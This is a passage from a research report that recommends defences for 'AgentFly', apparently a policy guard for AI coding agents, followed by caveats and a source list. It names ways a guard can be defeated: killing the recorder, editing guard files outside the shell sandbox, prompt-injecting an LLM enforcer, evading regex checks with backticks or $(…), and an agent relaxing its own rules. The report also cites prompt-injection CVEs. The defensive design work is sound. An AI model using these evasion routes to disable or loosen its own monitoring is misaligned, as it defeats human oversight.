3. **Split the API.** On the agent-reachable port, expose only `POST /decide`, which is append-only and returns a decision. Put rule CRUD and approvals on a separate Unix domain socket or port owned by the `agentfly` user and authenticated with the console secret. Treat any agent shell command that targets `:8787` or the socket as an R2 violation.
4. **Fail closed.** Set `failClosed: true` and a short `timeout` on every AgentFly hook. Have the hook script exit 2 if the recorder is unreachable or its response signature doesn't verify. Without this, killing the recorder disables the guard.
5. **Sign and pin.**
   - The recorder loads only rulesets signed with the owner key (OPA-bundle style), and the public key is pinned in the service config.\[19\]\[20\]
   - The hook script has a hash recorded in the managed hooks.json directory and is checked at `sessionStart`.
   - Recorder responses carry an HMAC so a fake "allow" server can't be substituted.
6. **Self-protection rule (R2) is `managed` and undeletable** from the NL flow.
7. **Watch for tampering.** On each `sessionStart`, the recorder checks that its hooks are still registered and unmodified, by hash. If something is missing it raises a highlighted alert. Also highlight any `afterFileEdit` touching `guard_paths`, which covers edits made through file tools rather than the shell, since Claude Code's sandbox docs note that file tools run outside the shell sandbox.\[73\]
8. **Belt and braces with the host tool:** turn on Cursor's sandbox and External-File protection and keep auto-run off. AgentFly is a second layer, not a substitute; Cursor's own docs call the allowlist "best-effort".\[14\]

### E. What to avoid (opinion)
- **An LLM in the enforcement hot path.** Cursor prompt hooks, gpt-oss-safeguard and PolicyGuard read policy at runtime. That suits *highlight* triage, but the model can be prompt-injected and is non-deterministic, and AWS itself says its NL-logic checks "will not protect against prompt injection".\[45\] Use LLMs only to *author* rules, or as an optional advisory `highlight` signal.
- **Fail-open hooks.** Cursor's default is fail-open.\[12\]
- **Regex or prefix matching on raw command strings.** See the built-in, backtick, `$(…)` and obfuscation bypasses. Parse, unwrap and canonicalize, and treat unparseable input as a match.
- **Case-sensitive or non-canonical path checks.** See CVE-2025-59944, the NTFS / backslash advisories and the CVE-2026-25724 symlink bypass.
- **Protecting only files that exist.** CurXecute (creating a missing dotfile) and CVE-2026-25725 (a missing `settings.json`) both exploited "protect if present".\[6\]\[61\] Glob-protect paths whether or not they exist.
- **Letting the agent propose or apply its own rule changes,** even "helpfully" ("this rule is blocking me, should I relax it?"). If you ever allow agent suggestions, they must go through the same out-of-band approval and the loosening check, and should be off by default (Progent's "Auto-Deny" stance).\[54\]
- **Ambiguous NL accepted silently.** Always surface ambiguities and a back-translation; never auto-activate.
- **Activation without backtest and shadow mode.** This produces surprise blocks that train users to disable the guard.
- **Assuming "ask" works everywhere.** Cursor's `preToolUse` schema accepts `ask`, but a third-party guide reports it "is not fully enforced today"\[77\] (https://ntorres.dev/blog/cursor-hooks-json-guide, date not shown). Map `warn` to deny where unsupported.
- **Project-scoped install as the product default.** It is the exact surface every config-rewrite CVE used.

## Caveats
- Several vendor docs pages are undated, so they are marked as retrieved 2026-10-14. Some CVE details come from secondary aggregators (SentinelOne, repello.ai, dev.to, vulners) rather than vendor advisories. The CVE-2026-35603 claim that Cursor is still unpatched rests on a single secondhand source.
- Cursor's protected-file list for `.cursor/hooks.json` specifically is **not found** in official docs, so AgentFly shouldn't assume Cursor protects it.
- Progent, CVE-2025-53773, CurXecute, MCPoison and the Amazon Q incident are older than 12 months. They are kept because they are foundational.
- Research numbers (Progent's attack-success reductions, the PolicyGuard results) come from the authors' own benchmarks and weren't independently reproduced.
- I didn't verify the rule-format details of Docker MCP Gateway, Lasso, Pangea, Microsoft MCP tooling, Copilot's agent firewall and Codex CLI sandboxing against primary sources ("not found" in this pass).

## Sources

1. [GitHub Copilot: Remote Code Execution via Prompt Injection (CVE-2025-53773) · Embrace The Red](https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/)
2. [Arbitrary code execution from Cursor Agent through a prompt injection via MCP Special Files · Advisory · cursor/cursor · GitHub](https://github.com/cursor/cursor/security/advisories/GHSA-4cxx-hrm3-49rm)
3. [Cursorignore Bypass via New Cursorignore Write · Advisory · cursor/cursor · GitHub](https://github.com/cursor/cursor/security/advisories/GHSA-vhc2-fjv4-wqch)
4. [Cursor Security: The 2026 Enterprise Hardening Guide](https://repello.ai/blog/cursor-security)
5. [NVD - CVE-2026-48124](https://nvd.nist.gov/vuln/detail/CVE-2026-48124)
6. [NVD - CVE-2026-25725](https://nvd.nist.gov/vuln/detail/CVE-2026-25725)
7. [Advisory Database](https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2026-33068)
8. [All settings - Claude Code Docs](https://code.claude.com/docs/en/settings-reference)
9. [Enterprise Claude Code with Managed Settings](https://systemprompt.io/guides/enterprise-claude-code-managed-settings)
10. [Hooks reference - Claude Code Docs](https://code.claude.com/docs/en/hooks)
11. [Claude Code Hooks Explained: The Deterministic Layer Around Your Agent](https://blakecrosley.com/blog/claude-code-hooks-explained)
12. [Hooks | Cursor Docs](https://cursor.com/docs/hooks)
13. [Run Modes | Cursor Docs](https://cursor.com/docs/agent/security/run-modes)
14. [Cursor Allowlist Bypass (CVE-2026-22708)](https://danusminimus.github.io/posts/The-Agent-Security-Paradox-When-Trusted-Commands-In-Cursor-Become-Attack-Vectors/)
15. [gemini-cli/packages/core/src/policy/policies/yolo.toml at main · google-gemini/gemini-cli · GitHub](https://github.com/google-gemini/gemini-cli/blob/main/packages/core/src/policy/policies/yolo.toml)
16. [Policy engine](https://geminicli.com/docs/reference/policy-engine/)
17. [Secure Gemini CLI with the Policy Engine](https://aipositive.substack.com/p/secure-gemini-cli-with-the-policy)
18. [Gemini CLI YOLO mode, read from the source: why settings.json can't turn it on - DEV Community](https://dev.to/agentrq/gemini-cli-yolo-mode-read-from-the-source-why-settingsjson-cant-turn-it-on-2kma)
19. [Bundles](https://www.openpolicyagent.org/docs/management-bundles)
20. [Release v0.22.0 · open-policy-agent/opa](https://github.com/open-policy-agent/opa/releases/v0.22.0)
21. [Discovery](https://www.openpolicyagent.org/docs/management-discovery)
22. [RAISE: Reinforcing Access Control Policy Synthesis in LLMs via Symbolic Evaluation](https://arxiv.org/html/2609.33796v1)
23. [How We Built Cedar: A Verification-Guided Approach](https://arxiv.org/pdf/2407.01688)
24. [Cedar: A New Language for Expressive, Fast, Safe, and Analyzable Authorization](http://muratbuffalo.blogspot.com/2025/03/cedar-new-language-for-expressive-fast.html)
25. [Cedar: A New Language for Expressive, Fast, Safe, and Analyzable Authorization](https://dl.acm.org/doi/10.1145/3649835)
26. [Writing Custom Semgrep Rules for Static Analysis](https://hackersonlineclub.com/writing-custom-semgrep-rules-for-static-analysis/)
27. [Rule structure syntax - Semgrep](https://docs.semgrep.dev/writing-rules/rule-syntax)
28. [How to Write Custom Semgrep Rules: Complete Tutorial - DEV Community](https://dev.to/rahulxsingh/how-to-write-custom-semgrep-rules-complete-tutorial-49o2)
29. [semgrep-rule-creator - Agent Skill for Claude Code, Cursor & Antigravity](https://agentpedia.codes/agent-skills/security/semgrep-rule-creator)
30. [Write rules using Semgrep Editor - Semgrep](https://semgrep.dev/docs/semgrep-code/editor)
31. [Overriding Rules](https://falco.org/docs/concepts/rules/overriding/)
32. [Basic Elements of Falco Rules](https://falco.org/docs/concepts/rules/basic-elements/)
33. [Rules System Documentation](https://deepwiki.com/falcosecurity/falco-website/4.2-rules-system-documentation)
34. [GitHub - invariantlabs-ai/invariant: Guardrails for secure and robust agent development · GitHub](https://github.com/invariantlabs-ai/invariant)
35. [Introducing Guardrails: The contextual security layer for the agentic era](https://invariantlabs.ai/blog/guardrails)
36. [Reference for Rule Writing - Invariant Documentation](https://explorer.invariantlabs.ai/docs/guardrails/rules/)
37. [Options, Not Clicks: Lattice Refinement for Consent-Driven MCP Authorization](https://arxiv.org/pdf/2605.11360)
38. [AgentFlow: A Flow-Centric Policy Language and Framework for Securing LLM Agent Systems](https://arxiv.org/pdf/2608.22868)
39. [AgentTrust:Runtime Safety Evaluation and Interceptionfor AI Agent Tool Use](https://arxiv.org/html/2605.04785v1)
40. [Claude Code has Permission Deny Bypass Through Symbolic Links · CVE-2026-25724 · GitHub Advisory Database · GitHub](https://github.com/advisories/ghsa-4q92-rfm6-2cqx)
41. [Automated Reasoning checks concepts - Amazon Bedrock](https://docs.aws.amazon.com/bedrock/latest/userguide/automated-reasoning-checks-concepts.html)
42. [Automated Reasoning policy refinement in Amazon Bedrock](https://aws.amazon.com/blogs/machine-learning/automated-reasoning-policy-refinement-in-amazon-bedrock/)
43. [Automated Reasoning checks now include natural language test Q&A generation - AWS](https://aws.amazon.com/about-aws/whats-new/2025/11/automated-reasoning-checks-include-natural-language/)
44. [Automated Reasoning checks in Amazon Bedrock Guardrails add new policy refinement workflows - AWS](https://aws.amazon.com/about-aws/whats-new/2026/06/amazon-bedrock-guardrails/)
45. [Improve accuracy by adding Automated Reasoning checks in Amazon Bedrock Guardrails - Amazon Bedrock](https://docs.aws.amazon.com/bedrock/latest/userguide/guardrails-automated-reasoning-checks.html)
46. [AWS News Blog](https://aws.amazon.com/blogs/aws/minimize-ai-hallucinations-and-deliver-up-to-99-verification-accuracy-with-automated-reasoning-checks-now-available/)
47. [Introducing gpt-oss-safeguard](https://openai.com/index/introducing-gpt-oss-safeguard/)
48. [User guide for gpt-oss-safeguard](https://developers.openai.com/cookbook/articles/gpt-oss-safeguard-guide)
49. [PolicyGuard: Prompt-Configurable Semantic DLP for LLM Coding Agents](https://arxiv.org/pdf/2608.02687)
50. [\[Literature Review\] Progent: Programmable Privilege Control for LLM Agents](https://www.themoonlight.io/en/review/progent-programmable-privilege-control-for-llm-agents)
51. [Paper page - Progent: Programmable Privilege Control for LLM Agents](https://huggingface.co/papers/2504.11703)
52. [Progent: Securing AI Agents with Privilege Control](https://www.alphaxiv.org/abs/2504.11703)
53. [Progent: A New Programming Language for Securing AI Agents](https://ai-papers-reader.taodong.net/2025-04-25/2504.11703/)
54. [Progent: Securing AI Agents with Privilege Control](https://arxiv.org/pdf/2504.11703)
55. [Autoformalization of Agent Instructions into Policy-as-Code](https://www.alphaxiv.org/abs/2606.26649)
56. [AutoCedar: An Agentic Framework forVerifier-Guided Access Control Policy Synthesis](https://arxiv.org/html/2607.03656)
57. [GitHub - semgrep/semgrep: Lightweight static analysis for many languages. Find bug variants with patterns that look like source code. · GitHub](https://github.com/semgrep/semgrep)
58. [GitHub Copilot RCE Vulnerability via Prompt Injection Leads to Full System Compromise](https://cybersecuritynews.com/github-copilot-rce-vulnerability/)
59. [GitHub Copilot vulnerability raises concerns of full system compromise](https://www.technewshub.co.uk/post/github-copilot-vulnerability-raises-concerns-of-full-system-compromise)
60. [When Public Prompts Turn Into Local Shells: ‘CurXecute’](https://www.catonetworks.com/blog/curxecute-rce/)
61. [CVE-2025-54135 - Cursor Unapproved File Writing and RCE Vulnerability](https://cvefeed.io/vuln/detail/CVE-2025-54135)
62. [NVD - CVE-2025-54136](https://nvd.nist.gov/vuln/detail/CVE-2025-54136)
63. [New MCPoison Attack Leverages Cursor IDE MCP Validation to Execute Arbitrary System Commands](https://cybersecuritynews.com/mcpoison-attack/)
64. [When AI Coding Assistants Turn Malicious: The Amazon Q Security Incident](https://colinmcnamara.com/blog/amazon-q-ai-security-incident-analysis)
65. [Amazon Q Developer VS Code Extension Wiper Prompt Injection - GHSA-7g7f-ff96-5gcw](https://anomity.ai/blog/amazon-q-developer-vscode-wiper-prompt-injection-ghsa-7g7f-ff96-5gcw/)
66. [Supply-chain attack inserts machine-wiping prompt into Amazon Q AI coding assistant](https://vibegraveyard.ai/story/amazon-q-malicious-prompt-injection/)
67. [AID-2025-0008: Amazon Q Developer VS Code extension shipped with data-wiping prompt injection · Agent Incident Database](https://www.makerchecker.ai/incidents/aid-2025-0008/)
68. [Amazon AI coding agent hacked to inject data wiping commands](https://www.bleepingcomputer.com/news/security/amazon-ai-coding-agent-hacked-to-inject-data-wiping-commands/)
69. [Build software better, together](https://github.com/cursor/cursor/security/advisories)
70. [CVE-2026-33068: Claude Code has a Workspace Trust Dialog Bypass via Repo-Controlled Settings File](https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2026-33068/)
71. [CVE-2026-40068: Claude Code Auth Bypass Vulnerability](https://www.sentinelone.com/vulnerability-database/cve-2026-40068/)
72. [CVE-2026-35603: Cursor Still Trusts a World-Writable Folder - DEV Community](https://dev.to/c_k_fb750e731394/cve-2026-35603-cursor-still-trusts-a-world-writable-folder-34p9)
73. [Configure the sandboxed Bash tool - Claude Code Docs](https://code.claude.com/docs/en/sandboxing)
74. [Choose a permission mode - Claude Code Docs](https://code.claude.com/docs/en/permission-modes)
75. [Lock Down Claude Code With 5 Permission Patterns - DEV Community](https://dev.to/klement_gunndu/lock-down-claude-code-with-5-permission-patterns-4gcn)
76. [Cursor AI Security Risks: 4 Critical Controls (2026)](https://checkmarx.com/learn/ai-security/cursor-security-risks-practices-4-critical-security-controls/)
77. [Cursor hooks.json: JSON Schema, Events & Payloads — Nicolás Torres](https://ntorres.dev/blog/cursor-hooks-json-guide)
